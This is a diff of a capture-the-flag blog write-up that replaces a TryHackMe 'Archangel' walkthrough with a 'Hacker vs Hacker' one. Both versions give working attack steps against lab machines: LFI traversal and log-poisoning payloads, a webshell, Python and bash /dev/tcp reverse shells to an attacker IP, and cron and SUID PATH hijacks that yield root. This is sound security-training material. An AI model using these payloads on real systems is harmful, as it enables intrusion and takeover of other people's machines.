@@ -11,282 +11,298 @@ image:
   path: /assets/img/2025-06-18-TryHackMe-Archangel/Archangel.png
 ---
 
-This is a write-up for the [Archangel room on TryHackMe](https://tryhackme.com/room/archangel), where I'll walk you through the shenanigans I pulled to conquer the challenges and snag the flags. Let's get hacking!
+Ahoy! This is my write-up for the [Hacker vs Hacker](https://tryhackme.com/room/hackervshacker) room on TryHackMe. Follow along as I walk you through the steps I took to solve the challenges and capture those sweet, sweet flags.
 
 # Enumeration
 
 ## Nmap Scan
 
-First things first, let's make life easier by saving the target IP to a variable. No one likes typing out IP addresses more than once.
+First things first, let's make life easier by exporting the target machine's IP address as an environment variable:
 
 ```bash
-export IP=10.10.58.58
+export IP=10.10.42.44
 ```
 
-With our target locked in, it's time to unleash `nmap` and see what doors are open.
+And now, let's run an `nmap` scan on our target to see what we're working with:
 
 ```bash
-# The nmap command and its glorious output would go here.
-# Example: nmap -sC -sV -oN nmap/initial $IP
+nmap -T4 -n -sC -sV -Pn -p- $IP
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-18 12:43 +0300
+Nmap scan report for 10.10.42.44
+Host is up (0.074s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
+|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
+|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: RecruitSec: Industry Leading Infosec Recruitment
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 43.66 seconds
 ```
 
-## Enumerating The Website
+The scan reveals two open ports:
 
-A quick browse to the IP address greets us with this little hint:
-![Desktop View](/assets/img/2025-06-18-TryHackMe-Archangel/photo1.png){: width="972" height="589" }
+- **22** `ssh`
+- **80** `http`
 
-Ah, a virtual host! The server won't talk to us unless we use its proper name. Let's add `mafialive.thm` to our `/etc/hosts`{: .filepath} file to get on the guest list.
+## Directory Fuzzing
 
-Now that we're using the right domain, let's `curl` the website again:
-
-```bash
-curl http://mafialive.thm
-<h1>UNDER DEVELOPMENT</h1>
-thm{*************************}
-```
-
-Well, that was easy! A flag right on the front page. I'll take it!
-
-## Fuzzing for Paths
-
-Time to see what's hiding in the shadows. Let's run `gobuster` on the IP address first.
+With the open ports identified, it's time for some digital digging. Let's unleash `gobuster` and see what treasures we can unearth on the web server.
 
 ```bash
-❯ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://$IP/ -x md,js,html,php,py,css,txt -t 50
+❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt -t 50
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://10.10.58.58/
+[+] Url:                     http://10.10.42.44/
+[+] Method:                  GET
 [+] Threads:                 50
-[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
-[+] ...
+[+] Wordlist:                common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              py,css,txt,md,js,html,php
+[+] Timeout:                 10s
 ===============================================================
-/flags                (Status: 301) [--> http://10.10.58.58/flags/]
-/images               (Status: 301) [--> http://10.10.58.58/images/]
-/index.html           (Status: 200)
-...
+Starting gobuster in directory enumeration mode
 ===============================================================
-```
-
-A `/flags` directory? That seems a little too good to be true...
-![Desktop View](/assets/img/2025-06-18-TryHackMe-Archangel/photo2.png){: width="972" height="589" }
-
-...and it was. We've been Rickrolled. A classic!
-
-![Desktop View](/assets/img/2025-06-18-TryHackMe-Archangel/photo3.png){: width="972" height="589" }
-
-Let's run `gobuster` again, but this time on our fancy new domain, `mafialive.thm`.
-
-```bash
-❯ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://mafialive.thm/ -x md,js,html,php,py,css,txt -t 50
+/.hta                 (Status: 403) [Size: 276]
+/.hta.php             (Status: 403) [Size: 276]
+<-- snip -->
+/css                  (Status: 301) [Size: 308] [--> http://10.10.42.44/css/]
+/cvs                  (Status: 301) [Size: 308] [--> http://10.10.42.44/cvs/]
+/dist                 (Status: 301) [Size: 309] [--> http://10.10.42.44/dist/]
+/images               (Status: 301) [Size: 311] [--> http://10.10.42.44/images/]
+/index.html           (Status: 200) [Size: 3413]
+/server-status        (Status: 403) [Size: 276]
+/upload.php           (Status: 200) [Size: 552]
+Progress: 37912 / 37912 (100.00%)
 ===============================================================
-...
-===============================================================
-/index.html           (Status: 200)
-/robots.txt           (Status: 200)
-/test.php             (Status: 200)
-...
+Finished
 ===============================================================
 ```
 
-Now `/test.php` looks _very_ interesting. Let's see what it's all about.
+And we have a winner! The `/upload.php` file looks mighty interesting. Let's investigate.
+
+## Enumerating the Web Server
+
+A quick `curl` of the `/upload.php` file reveals some juicy source code left in an HTML comment.
 
 ```bash
-❯ curl http://mafialive.thm/test.php
-<!DOCTYPE HTML>
-<html>
-<head>
-    <title>INCLUDE</title>
-    <h1>Test Page. Not to be Deployed</h1>
-    ...
-    <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
-    ...
-</html>
+❯ curl http://$IP/upload.php
+Hacked! If you dont want me to upload my shell, do better at filtering!
+
+<!-- seriously, dumb stuff:
+
+$target_dir = "cvs/";
+$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
+
+if (!strpos($target_file, ".pdf")) {
+  echo "Only PDF CVs are accepted.";
+} else if (file_exists($target_file)) {
+  echo "This CV has already been uploaded!";
+} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+  echo "Success! We will get back to you.";
+} else {
+  echo "Something went wrong :|";
+}
 ```
 
-The page has a `view` parameter that's including a local file. This smells like a Local File Inclusion (LFI) vulnerability! Let's try to get it to read `/etc/passwd`.
+The webpage also has a handy upload section.
+
+![Desktop View](/assets/img/2025-06-18-TryHackMe-Hacker_vs_Hacker/photo1.png){: width="1044" height="409" }
+
+The PHP code shows a very weak filter: it only checks if the string `.pdf` exists in the filename. It doesn't check the actual file type or prevent other extensions.
+
+Naturally, I tried to upload the classic pentestmonkey PHP reverse shell. I tried every extension I could think of: `.php`, `.pdf`, `.pdf.php`, and even `.php.pdf`. But alas, the server wasn't buying it. It seems the filter is a bit smarter than it lets on.
+
+Time for round two with `gobuster`! Knowing that uploaded files go to the `/cvs/` directory and that there's some funny business with `.pdf` files, I decided to fuzz that specific directory for files with a `.pdf.php` extension.
 
 ```bash
-❯ curl "http://mafialive.thm/test.php?view=/etc/passwd"
-...
-Sorry, Thats not allowed
-...
+❯ gobuster dir -w common.txt -u http://$IP/cvs/ -x pdf.php -t 50
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.42.44/cvs/
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              pdf.php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 276]
+<-- snip -->
+/index.html           (Status: 200) [Size: 26]
+/shell.pdf.php        (Status: 200) [Size: 18]
+Progress: 9478 / 9478 (100.00%)
+===============================================================
+Finished
+===============================================================
 ```
 
-Denied! But what if we're a little sneakier? The developers might have put a filter in place. Let's try to bypass it with some classic path traversal trickery.
+And what do you know! It seems the other hacker already left a backdoor for us: `/shell.pdf.php`. How thoughtful! Let's see if we can get some basic command execution going.
 
 ```bash
-❯ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//etc/passwd"
-...
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-...
-archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
-...
+❯ curl http://$IP/cvs/shell.pdf.php?cmd=id
+<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>
+boom!%
 ```
 
-Success! The `..//..//` trick worked. Now we can read files! Let's go for the user flag.
+Boom! We have Remote Code Execution (RCE). Now we're cooking with gas!
+
+## Gaining a Reverse Shell
+
+Let's try to get a proper shell. On my machine, I'll start a netcat listener.
 
 ```bash
-❯ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//home/archangel/user.txt"
-...
-thm{***_**_***_**_******}
-...
+nc -lvnp 4444
 ```
 
-Got it! Now, out of curiosity, let's see the source code of that `test.php` page to understand how we tricked it. We can use a PHP filter to have the server base64-encode the source for us.
+Then, using my browser, I'll hit the webshell with a URL-encoded Python reverse shell payload. You can generate your own at awesome sites like [revshells.com](https://www.revshells.com).
+
+`http://10.10.42.44/cvs/shell.pdf.php?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22YOUR_IP%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27`
 
 ```bash
-❯ curl "http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/test.php"
-...
-# long base64 string appears here
-...
+❯ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.42.44 53822
+$ ls
+ls
+index.html  shell.pdf.php
+$ nope
 ```
 
-Let's decode that blob of text:
+Whoops, it looks like the other hacker is actively trying to kick us out of our hard-earned shell. How rude! Since an interactive shell is a no-go, I'll just stick to using `curl` to send commands from the safety of my own terminal.
+
+## Enumerating the Filesystem
+
+Let's see what users are on this machine.
 
 ```bash
-❯ echo "..." | base64 -d
+❯ curl "http://$IP/cvs/shell.pdf.php?cmd=ls%20-la%20/home"
+<pre>total 12
+drwxr-xr-x  3 root    root    4096 May  5  2022 .
+drwxr-xr-x 19 root    root    4096 May  5  2022 ..
+drwxr-xr-x  4 lachlan lachlan 4096 May  5  2022 lachlan
+</pre>
 ```
 
-```php
-<!DOCTYPE HTML>
-<html>
-<head>
-    <title>INCLUDE</title>
-    <h1>Test Page. Not to be Deployed</h1>
-    ...
-        <?php
-
-	   //FLAG: thm{**************}
-
-            function containsStr($str, $substr) {
-                return strpos($str, $substr) !== false;
-            }
-	   if(isset($_GET["view"])){
-	   if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
-            	include $_GET['view'];
-            }else{
-		echo 'Sorry, Thats not allowed';
-            }
-	}
-        ?>
-    </div>
-</body>
-</html>
-```
-
-Aha! Another flag hidden in the comments! And we can see the logic: it blocks `../..` but not a single `../`. That's why our `..//..//` payload worked beautifully.
-
-# Gaining A Shell
-
-Reading files is cool, but a shell is way cooler. We can turn this LFI into Remote Code Execution (RCE) with a technique called log poisoning. The plan is to inject PHP code into the web server's log file, and then use our LFI to execute that log file.
-
-1.  **Poison the Logs:** We'll send a request to the server with our malicious PHP payload as the User-Agent. This gets our code written into the `access.log`. The payload will simply download and save a reverse shell script.
-
-    ```bash
-    # On your machine, start a web server serving a PHP reverse shell script.
-    # Then, send this request to poison the log:
-    curl http://mafialive.thm/ -A "<?php system('wget http://<YOUR_IP>/shell.php'); ?>"
-    ```
-
-2.  **Execute the Log:** Now, use the LFI to include the Apache log file. This will execute our payload.
-
-    ```bash
-    curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//var/log/apache2/access.log"
-    ```
-
-3.  **Get the Shell:** Start a listener (`nc -lvnp 4444`), then trigger the shell you just uploaded.
-
-    ```bash
-    curl http://mafialive.thm/shell.php
-    ```
-
-Boom! We should have a reverse shell as the `www-data` user.
-
-## Upgrading the Shell
-
-This basic shell is a bit... basic. Let's give it a full interactive TTY makeover.
+Let's poke around in `lachlan`'s home directory.
 
 ```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm-256color
-# Press Ctrl+Z
-stty raw -echo; fg
-reset
+❯ curl "http://$IP/cvs/shell.pdf.php?cmd=ls%20-la%20/home/lachlan"
+<pre>total 36
+drwxr-xr-x 4 lachlan lachlan 4096 May  5  2022 .
+drwxr-xr-x 3 root    root    4096 May  5  2022 ..
+-rw-r--r-- 1 lachlan lachlan  168 May  5  2022 .bash_history
+-rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 lachlan lachlan 3771 Feb 25  2020 .bashrc
+drwx------ 2 lachlan lachlan 4096 May  5  2022 .cache
+-rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
+drwxr-xr-x 2 lachlan lachlan 4096 May  5  2022 bin
+-rw-r--r-- 1 lachlan lachlan   38 May  5  2022 user.txt
+</pre>
 ```
 
-# Privilege Escalation
-
-## `www-data` to `archangel`
-
-Let's poke around. The `/opt/`{: .filepath} directory looks interesting.
+The `.bash_history` file always contains interesting tidbits. Let's take a look.
 
 ```bash
-www-data@ubuntu:/opt$ ls -la
-drwxrwxrwx  3 root      root      4096 Nov 20  2020 .
--rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
+❯ curl "http://$IP/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/.bash_history"
+<pre>./cve.sh
+./cve-patch.sh
+vi /etc/cron.d/persistence
+echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
+ls -sf /dev/null /home/lachlan/.bash_history
+</pre>
 ```
 
-A script named `helloworld.sh` that is world-writable? It's like they're _asking_ for a shell. This is almost certainly being run by a cron job. Let's replace its contents with our own reverse shell payload.
+Jackpot! Peeking into the bash history reveals a new password being set: `thisistheway123`. It looks like we've got the credentials for the user **lachlan**.
 
-Set up a new listener on your machine (e.g., on port 4445), and then run this on the target:
+## Connecting to the Machine via SSH
+
+Let's try to log in as `lachlan`.
 
 ```bash
-www-data@ubuntu:/opt$ echo 'bash -i >& /dev/tcp/<YOUR_IP>/4445 0>&1' > /opt/helloworld.sh
+❯ ssh lachlan@$IP
+lachlan@10.10.42.44's password:
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
+<-- snip -->
+Last login: Wed Jun 18 10:41:40 2025 from 10.21.206.128
+$ nope
+Connection to 10.10.42.44 closed.
 ```
 
-Now we wait. After a minute, the cron job should fire, and we'll get a new shell as the `archangel` user! With these new powers, we can finally grab that second flag.
+Aaaand we're kicked out. Again. It seems the default login shell is trapped. But what if we don't _use_ the default shell? Let's try specifying `/bin/bash` directly in our SSH command.
 
 ```bash
-archangel@ubuntu:~/secret$ cat user2.txt
-thm{********************************************}
+ssh lachlan@$IP /bin/bash
 ```
 
-## `archangel` to `root`
-
-Inside that `secret` directory, there's another file: a binary called `backup` with the SUID bit set. This is a special gift that runs with `root` privileges.
-
-Let's download it to our machine and see what makes it tick. Running `strings` on it gives us the jackpot:
+Success! That little trick got us a stable shell. We're in! Let's grab the user flag.
 
 ```bash
-❯ strings backup
-...
-cp /home/archangel/myfiles/* /opt/backupfiles
-...
+$ ls -la
+total 36
+drwxr-xr-x 4 lachlan lachlan 4096 May  5  2022 .
+drwxr-xr-x 3 root    root    4096 May  5  2022 ..
+-rw-r--r-- 1 lachlan lachlan  168 May  5  2022 .bash_history
+-rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 lachlan lachlan 3771 Feb 25  2020 .bashrc
+drwxr-xr-x 2 lachlan lachlan 4096 May  5  2022 bin
+drwx------ 2 lachlan lachlan 4096 May  5  2022 .cache
+-rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
+-rw-r--r-- 1 lachlan lachlan   38 May  5  2022 user.txt
+$ cat user.txt
+thm{*****************************}
 ```
 
-The binary runs a `cp` command, but here's the kicker: it doesn't use the full path (`/bin/cp`). This is our golden ticket! We can hijack the `PATH` to run our own malicious `cp`.
+## Privilege Escalation
 
-Here's the master plan:
-
-1.  Go to a writable directory like `/tmp`.
-2.  Create a file named `cp` containing a command to spawn a root shell.
-3.  Make our fake `cp` executable.
-4.  Add `/tmp` to the beginning of our `PATH` environment variable. This way, when the system looks for `cp`, it finds ours first.
-5.  Run the SUID binary and watch the magic happen.
-
-Let's do it:
+While snooping around `lachlan`'s home directory, a `bin` folder caught my eye. This is interesting because user-level `bin` directories are often included in the `PATH`. Let's see what's inside and check the system's cron jobs.
 
 ```bash
-# Navigate to our staging area
-cd /tmp
+$ cat /etc/cron.d/persistence
+PATH=/home/lachlan/bin:/bin:/usr/bin
+# * * * * * root backup.sh
+* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
+<-- snip -->
+```
 
-# Create our malicious cp script
-echo "/bin/bash -p" > cp
+This is our moment to shine! The root user is running a cron job every minute that calls `pkill` to kick out interactive shells (that explains our earlier problem!). Crucially, the `PATH` for this cron job includes `/home/lachlan/bin` _before_ `/bin` or `/usr/bin`. This means if we create our own executable file named `pkill` in `lachlan`'s `bin` directory, the cron job will run _our_ script as root instead of the real `pkill`.
 
-# Give it execute permissions
-chmod +x cp
+Time to craft our malicious `pkill` script. A simple one-liner that launches a reverse shell should do the trick.
 
-# Hijack the PATH
-export PATH=/tmp:$PATH
+```bash
+echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" > pkill;chmod +x pkill
+```
 
-# Run the SUID binary and claim our prize
-/home/archangel/secret/backup
+I'll set up another `nc` listener on my machine, cross my fingers, and wait for the cron job to trigger. A minute later...
 
-# whoami
+```bash
+❯ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.42.44 53902
+bash: cannot set terminal process group (28694): Inappropriate ioctl for device
+bash: no job control in this shell
+root@b2r:~# whoami
 root
+root@b2r:~# ls
+root.txt
+snap
+root@b2r:~# cat root.txt
+thm{**********************************}
 ```
 
-And just like that, we're root! Now all that's left is to read the final flag from `/root/root.txt`. Job done!
+And we have a root shell! Game over. Thanks for reading
